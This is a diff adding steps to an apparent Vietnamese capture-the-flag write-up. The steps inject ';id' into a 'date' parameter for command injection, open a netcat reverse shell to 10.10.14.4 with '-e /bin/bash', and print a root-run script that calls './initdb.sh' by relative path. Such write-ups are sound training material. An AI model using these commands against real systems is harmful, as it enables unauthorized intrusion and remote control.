@@ -43,3 +43,46 @@ decode ra
 - sửa cookie
 ![image 15](image/15.png)
 - truy cập thành công
+- Bật burp suite lên, bắt request 
+![image 16](image/16.png)
+- Thấy parameter là date, ta có thể phỏng đoán rằng lệnh này lấy dữ liệu từ máy chủ, chèn thử  ";id" vào
+![image 17](image/17.png)
+- Ta tạo 1 reverse shell bằng netcat, kết nối ngược lại với máy tấn công.
+```
+nc 10.10.14.4 1379 -e /bin/bash
+```
+- Trên máy tấn công: nc -nvlp 1379
+![image 18](image/18.png)
+- để tăng hiệu năng cho script nhập thêm lệnh: script /dev/null -c /bin/bash
+![alt text](image.png)
+![alt text](image-1.png)
+```
+cat /usr/bin/syscheck
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+
+```
+![alt text](image-2.png)
+![alt text](image-3.png)
